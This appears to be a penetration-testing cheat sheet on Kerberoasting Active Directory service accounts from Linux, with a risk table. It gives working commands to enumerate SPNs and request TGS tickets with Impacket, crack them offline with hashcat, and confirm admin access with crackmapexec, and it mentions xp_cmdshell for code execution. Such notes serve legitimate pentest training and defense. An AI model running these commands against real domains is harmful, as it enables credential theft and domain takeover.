# Kerberoasting from Linux

## Overview

**Kerberoasting** is a lateral movement and privilege escalation technique targeting **Service Principal Name (SPN)** accounts in Active Directory. This attack leverages the fact that any domain user can request a Kerberos ticket for any service account within the same domain or across permitted forest trusts.

### When to Use

Use this technique when you have obtained:

- A domain account's **cleartext password** or **NTLM hash**.
- A **shell** in the context of a domain user.
- **SYSTEM** level access on a domain-joined host.

### Why it Matters

Service accounts often run with **elevated privileges** (Local Administrator or Domain Admin) to facilitate network authentication and data transfers. Because the **TGS-REP** (ticket) is encrypted with the service account's **NTLM hash**, the cleartext password can be recovered through **offline brute-force attacks**.

Success allows you to:

- Escalate to **Domain Admin** if the service account is highly privileged.
- Access specific services (e.g., **MSSQL**) as a **sysadmin**, enabling features like `xp_cmdshell` for code execution.

---

## Dangerous Misconfigurations

|Misconfiguration|Impact|
|:--|:--|
|**Service accounts in privileged groups**|Cracking a single ticket can lead to immediate **Domain Admin** access.|
|**Weak or reused passwords**|Significantly increases the success rate of offline cracking.|
|**Passwords matching usernames**|Common in service accounts to simplify administration; easily guessed by wordlists.|

---

## Operational Workflow

### 1. Tooling Installation

**Impacket** is required to perform these attacks from Linux.

|Command|Action|
|:--|:--|
|`sudo python3 -m pip install .`|Installs Impacket tools and adds them to the system **PATH**.|

### 2. Service Principal Name (SPN) Enumeration

Before requesting tickets, identify which user accounts have SPNs and their **group memberships** (e.g., Domain Admins) to prioritize high-value targets.

```
GetUserSPNs.py -dc-ip <TARGET_IP> <DOMAIN>/<USERNAME>
```

_Note: This command generates a credential prompt for the user's password._

### 3. Requesting and Saving TGS Tickets

Request the tickets from the **Domain Controller**. These are provided in a format compatible with **Hashcat** or **John the Ripper**.

|Goal|Command|
|:--|:--|
|**Request All Tickets**|`GetUserSPNs.py -dc-ip <TARGET_IP> <DOMAIN>/<USERNAME> -request`|
|**Target Specific User**|`GetUserSPNs.py -dc-ip <TARGET_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_USERNAME>`|
|**Save to File**|`GetUserSPNs.py -dc-ip <TARGET_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_USERNAME> -outputfile <OUTPUT_FILE>`|

### 4. Offline Password Cracking

Use **Hashcat** to attempt to recover the cleartext password. TGS tickets generally take longer to crack than standard NTLM hashes.

**Hashcat Parameters:**

- `-m 13100`: Specifies the **Kerberos 5, etype 23, TGS-REP** hash mode.

```
hashcat -m 13100 <OUTPUT_FILE> /usr/share/wordlists/rockyou.txt
```

### 5. Verification of Access

If a password is recovered, confirm the account's privileges by authenticating against the **Domain Controller**.

```
sudo crackmapexec smb <TARGET_IP> -u <TARGET_USERNAME> -p <PASSWORD>
```

_A result of **(Pwn3d!)** confirms administrative rights._

---

## Attack Implications & Risk Assessment

|Scenario|Risk Level|Technique Unlock|
|:--|:--|:--|
|**Privileged Ticket Cracked**|**High**|Immediate **Domain Admin** access or lateral movement to multiple servers.|
|**Unprivileged Ticket Cracked**|**High**|Access to specific services; if MSSQL, allows **sysadmin** access and code execution.|
|**No Tickets Cracked**|**Medium**|Mitigating controls (strong passwords) are in place, but SPNs remain a risk if passwords are later changed to weaker ones.|